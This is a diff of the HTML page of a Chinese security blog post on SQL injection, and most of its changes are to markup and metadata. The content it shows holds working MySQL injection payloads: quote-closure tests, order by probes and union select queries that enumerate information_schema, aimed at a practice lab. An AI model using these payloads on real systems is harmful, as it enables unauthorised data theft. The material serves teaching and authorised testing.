@@ -17,12 +17,28 @@
 <meta property="og:description" content="SQL 注入的原理、分类（联合/报错/布尔/时间盲注）、常见注入点与手工利用思路。">
 <meta property="og:url" content="https://blogbu2154.site/sql-injection-basics/">
 <meta property="og:site_name" content="swfk 的安全笔记">
-<meta property="og:image" content="/medias/featureimages/0.jpg">
-<meta name="twitter:card" content="summary">
+<meta property="og:locale" content="zh_CN">
+
+<meta property="og:image" content="https://blogbu2154.site/medias/featureimages/0.jpg">
+<meta property="og:image:alt" content="SQL 注入漏洞原理与利用 - swfk 的安全笔记">
+
+
+<meta property="article:published_time" content="2025-12-02T01:16:43+08:00">
+<meta property="article:modified_time" content="2025-12-02T01:16:43+08:00">
+
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blogbu2154.site/medias/featureimages/0.jpg">
 <link rel="alternate" type="application/atom+xml" title="swfk 的安全笔记" href="/atom.xml">
 <link rel="stylesheet" href="/css/clay.css">
 
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+<link rel="stylesheet" href="/aplayer/APlayer.min.css">
+
+
+<link rel="dns-prefetch" href="https://giscus.app">
+<link rel="preconnect" href="https://giscus.app" crossorigin>
+
+
+<link rel="dns-prefetch" href="https://busuanzi.ibruce.info">
 
 <script>
   // 尽早恢复主题，避免首屏闪烁
@@ -80,7 +96,7 @@
 <aside class="article__aside">
   <div class="toc-box">
     <div class="toc-box__title">目录</div>
-    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81Web-%E6%BC%8F%E6%B4%9E"><span class="toc-text">常见Web 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E7%9A%84%E5%B8%B8%E8%A7%81Web-%E6%BC%8F%E6%B4%9E"><span class="toc-text">具体的常见Web 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E5%AD%A6"><span class="toc-text">怎么学</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0%EF%BC%88%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%89"><span class="toc-text">1 产生原因（是什么）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%B1%E5%AE%B3"><span class="toc-text">2 危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%8C%96%E6%8E%98"><span class="toc-text">3 挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">1 代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-text">2 漏洞挖掘</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-text">示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E9%97%AD%E5%90%88%E6%96%B9%E6%B3%95"><span class="toc-text">测试闭合方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%AD%901-%E5%BC%95%E5%8F%B7%E6%B5%8B%E8%AF%95%E9%97%AD%E5%90%88"><span class="toc-text">⭐1  引号测试闭合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%AD%902-and-%E6%B5%8B%E8%AF%95"><span class="toc-text">⭐2  and 测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%AD%903-or-%E6%B5%8B%E8%AF%95"><span class="toc-text">⭐3  or 测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%AD%904-%E4%B8%8D%E5%8A%A0%E6%B3%A8%E9%87%8A%E7%AC%A6%E9%97%AD%E5%90%88%E6%B5%8B%E8%AF%95"><span class="toc-text">⭐4  不加注释符闭合测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%AD%905-sleep-%E6%B5%8B%E8%AF%95"><span class="toc-text">⭐5  sleep 测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%AD%906-order-by-%E6%B5%8B%E8%AF%95"><span class="toc-text">⭐6 order by 测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8"><span class="toc-text">4 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">1  显错注入-联合查询</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0%E4%BB%BB%E5%8A%A1%EF%BC%9A%E8%8E%B7%E5%8F%96-mysql-root%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81hash"><span class="toc-text">练习任务：获取 mysql root用户的密码hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2  显错注入-报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%9B%B2%E6%B3%A8-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3  盲注-布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%9B%B2%E6%B3%A8-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">4  盲注-时间盲注</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81Web-%E6%BC%8F%E6%B4%9E"><span class="toc-text">常见Web 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B7%E4%BD%93%E7%9A%84%E5%B8%B8%E8%A7%81Web-%E6%BC%8F%E6%B4%9E"><span class="toc-text">具体的常见Web 漏洞</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%8E%E4%B9%88%E5%AD%A6"><span class="toc-text">怎么学</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">SQL注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BA%A7%E7%94%9F%E5%8E%9F%E5%9B%A0%EF%BC%88%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%89"><span class="toc-text">1 产生原因（是什么）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%8D%B1%E5%AE%B3"><span class="toc-text">2 危害</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%8C%96%E6%8E%98"><span class="toc-text">3 挖掘</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1"><span class="toc-text">1 代码审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98"><span class="toc-text">2 漏洞挖掘</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-text">示例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95%E9%97%AD%E5%90%88%E6%96%B9%E6%B3%95"><span class="toc-text">测试闭合方法</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%AD%901-%E5%BC%95%E5%8F%B7%E6%B5%8B%E8%AF%95%E9%97%AD%E5%90%88"><span class="toc-text">1  引号测试闭合</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%AD%902-and-%E6%B5%8B%E8%AF%95"><span class="toc-text">2  and 测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%AD%903-or-%E6%B5%8B%E8%AF%95"><span class="toc-text">3  or 测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%AD%904-%E4%B8%8D%E5%8A%A0%E6%B3%A8%E9%87%8A%E7%AC%A6%E9%97%AD%E5%90%88%E6%B5%8B%E8%AF%95"><span class="toc-text">4  不加注释符闭合测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%AD%905-sleep-%E6%B5%8B%E8%AF%95"><span class="toc-text">5  sleep 测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%AD%906-order-by-%E6%B5%8B%E8%AF%95"><span class="toc-text">6 order by 测试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E5%88%A9%E7%94%A8"><span class="toc-text">4 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5-%E8%81%94%E5%90%88%E6%9F%A5%E8%AF%A2"><span class="toc-text">1  显错注入-联合查询</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BB%83%E4%B9%A0%E4%BB%BB%E5%8A%A1%EF%BC%9A%E8%8E%B7%E5%8F%96-mysql-root%E7%94%A8%E6%88%B7%E7%9A%84%E5%AF%86%E7%A0%81hash"><span class="toc-text">练习任务：获取 mysql root用户的密码hash</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%98%BE%E9%94%99%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-text">2  显错注入-报错注入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E7%9B%B2%E6%B3%A8-%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-text">3  盲注-布尔盲注</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E7%9B%B2%E6%B3%A8-%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-text">4  盲注-时间盲注</span></a></li></ol></li></ol></li></ol>
   </div>
 </aside>
 
@@ -91,8 +107,6 @@
         <h1>SQL 注入漏洞原理与利用</h1>
         <div class="post-meta">
           <time datetime="2025-12-02">2025-12-02</time>
-          
-            <span>更新于 2026-08-29</span>
           
         </div>
       </header>
@@ -112,11 +126,11 @@
 <p>2  <strong>安全配置错误</strong>  ： 默认密码、启用或安装了不必要的功能</p>
 <p>3  <strong>供应链安全</strong>  ： 过时的操作系统、Web&#x2F;应用服务器、数据库管理系统 (DBMS)、应用程序、API 及其所有组件、运行时环境和库存在的漏洞</p>
 <p>4  <strong>不安全的加密</strong>  ： 没有用https、加密密钥是否已 提交到源代码库中、使用或旧代码中 使用的过时或 弱加密算法或协议、未加密的协议如 FTP</p>
-<p>5  **注入 ** ： SQL注入、RCE、XXE、LDAP注入、JNDI注入、SSTI 等</p>
+<p>5  <strong>注入</strong> ： SQL注入、RCE、XXE、LDAP注入、JNDI注入、SSTI 等</p>
 <p>6  <strong>不安全的设计</strong>  ： 支付逻辑漏洞、抢购、本地时间验证</p>
 <p>7  <strong>错误的身份验证</strong>  ：  弱口令，没有多因素身份验证（MFA）、简单的忘记密码等</p>
 <p>8  <strong>数据完整性问题</strong>  ： 数字签名缺失</p>
-<p>9   **缺失日志和警报  **：没有日志记录和监控,攻击和漏洞就无法被察觉,且在安全事件中,若不发出警报,将很难快速有效地响应。日志记录、持续监控、检测和警报不足,无法随时启动主动响应</p>
+<p>9   <strong>缺失日志和警报</strong>：没有日志记录和监控,攻击和漏洞就无法被察觉,且在安全事件中,若不发出警报,将很难快速有效地响应。日志记录、持续监控、检测和警报不足,无法随时启动主动响应</p>
 <p>10  <strong>特殊情况处理不当</strong>  ： 逻辑缺陷、溢出、种族状况、欺诈性交易,或内存、状态、资源、时间、身份验证和授权问题。这类漏洞可能对系统或数据的保密性、可用性和&#x2F;或完整性产生负面影响</p>
 <h2 id="具体的常见Web-漏洞"><a href="#具体的常见Web-漏洞" class="headerlink" title="具体的常见Web 漏洞"></a>具体的常见Web 漏洞</h2><p>SQL注入、XSS、CSRF、SSRF、文件包含、文件上传、CORS、XXE、弱口令、未授权访问、SSTI、RCE、反序列化、CRLF、越权 等</p>
 <h2 id="怎么学"><a href="#怎么学" class="headerlink" title="怎么学"></a>怎么学</h2><pre><code class="hljs plain">漏洞的产生原因（原理）
@@ -160,7 +174,7 @@
 
 <p>说明：可能存在SQL注入漏洞，且闭合是单引号 （加上 ‘ or 1&#x3D;1# 查询出了正确结果）</p>
 <p>靶场角度： 输入 -1 ，没有查询到学生成绩，输入  -1’  or 1&#x3D;1# 查询到学生成绩</p>
-<h3 id="⭐4-不加注释符闭合测试"><a href="#⭐4-不加注释符闭合测试" class="headerlink" title="⭐4  不加注释符闭合测试"></a>⭐4  不加注释符闭合测试</h3><p> (mysql 的注释符 # 、 –空格**(双连字符+空格)**)</p>
+<h3 id="⭐4-不加注释符闭合测试"><a href="#⭐4-不加注释符闭合测试" class="headerlink" title="⭐4  不加注释符闭合测试"></a>⭐4  不加注释符闭合测试</h3><p> (mysql 的注释符 # 、 –空格 <strong>(双连字符+空格)</strong>)</p>
 <pre><code class="hljs plain">正确的值&#x27;  and  1=&#x27;1
 非正确的值&#x27; or  1=&#x27;1</code></pre>
 
@@ -174,7 +188,7 @@
 
 <p>说明：以表的第999列进行排序，但是一般的表都没有999列，就会报错，说明闭合是单引号</p>
 <h3 id="4-利用"><a href="#4-利用" class="headerlink" title="4 利用"></a>4 利用</h3><h4 id="1-显错注入-联合查询"><a href="#1-显错注入-联合查询" class="headerlink" title="1  显错注入-联合查询"></a>1  显错注入-联合查询</h4><p>前置知识：information_schema</p>
-<p>**information_schema 信息概要数据库：  **</p>
+<p><strong>information_schema 信息概要数据库：</strong></p>
 <pre><code class="hljs plain">schemata 表：保存了 mysql 数据库所有的数据库名
 tables 表：保存了mysql 数据库的所有的数据库的所有的表信息
 columns 表：保存了 mysql 数据库的所有数据库的所有表的所有列信息</code></pre>
@@ -198,7 +212,7 @@ columns 表：保存了 mysql 数据库的所有数据库的所有表的所有�
 <h5 id="2-判断回显位"><a href="#2-判断回显位" class="headerlink" title="2  判断回显位"></a>2  判断回显位</h5><p> union select 联合查询</p>
 <pre><code class="hljs plain">-1&#x27; union  select  1,2#</code></pre>
 
-<h5 id="3-使用函数获取基础信息"><a href="#3-使用函数获取基础信息" class="headerlink" title="3  使用函数获取基础信息"></a>3  使用函数获取基础信息</h5><p>**替换回显位为mysql自带的函数，获取一些数据库信息  **</p>
+<h5 id="3-使用函数获取基础信息"><a href="#3-使用函数获取基础信息" class="headerlink" title="3  使用函数获取基础信息"></a>3  使用函数获取基础信息</h5><p><strong>替换回显位为mysql自带的函数，获取一些数据库信息</strong></p>
 <pre><code class="hljs plain">-1&#x27; union select 1,version()#
 -1&#x27; union select version(),2#</code></pre>
 
@@ -207,7 +221,7 @@ user() 获取 mysql 当前用户
 database() 获取当前的数据库名
 @@basedir 获取 mysql 的路径</code></pre>
 
-<p>**如果是挖掘src漏洞，到此截止  **</p>
+<p><strong>如果是挖掘src漏洞，到此截止</strong></p>
 <h5 id="4-获取数据"><a href="#4-获取数据" class="headerlink" title="4  获取数据"></a>4  获取数据</h5><h6 id="1-数据库名"><a href="#1-数据库名" class="headerlink" title="1  数据库名"></a>1  数据库名</h6><pre><code class="hljs plain">-1&#x27; union select 1,2#
 -1&#x27; union select schema_name,2 from information_schema.schemata#
 -1&#x27; union select 1,schema_name from information_schema.schemata#</code></pre>
@@ -224,8 +238,8 @@ database() 获取当前的数据库名
 -1&#x27; union select schema_name,2 from information_schema.schemata limit 3,1#
 -1&#x27; union select schema_name,2 from information_schema.schemata limit 4,1#</code></pre>
 
-<p>**解释：limit a,b 意思为 从a开始选b行作为结果（不包括a本身）  **</p>
-<p>**如limit 4,1 ，意思从4行开始选1行结果（不包括4行本身），所以选择的是第5行  **</p>
+<p><strong>解释：limit a,b 意思为 从a开始选b行作为结果（不包括a本身）</strong></p>
+<p><strong>如limit 4,1 ，意思从4行开始选1行结果（不包括4行本身），所以选择的是第5行</strong></p>
 <h6 id="2-表名"><a href="#2-表名" class="headerlink" title="2  表名"></a>2  表名</h6><p>一般获取的是当前数据库的表名</p>
 <pre><code class="hljs plain">-1&#x27; union select table_name,2 from information_schema.tables where table_schema=&#x27;school&#x27;#</code></pre>
 
@@ -635,7 +649,7 @@ sleep 5 没有触发,说明school数据库的flag表的flag列的第一行数据
 <script src="/js/clay.js"></script>
 <script src="/js/search.js"></script>
 
-<script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+<script src="/aplayer/APlayer.min.js"></script>
 <script src="/js/music-loader.js"></script>
 
 
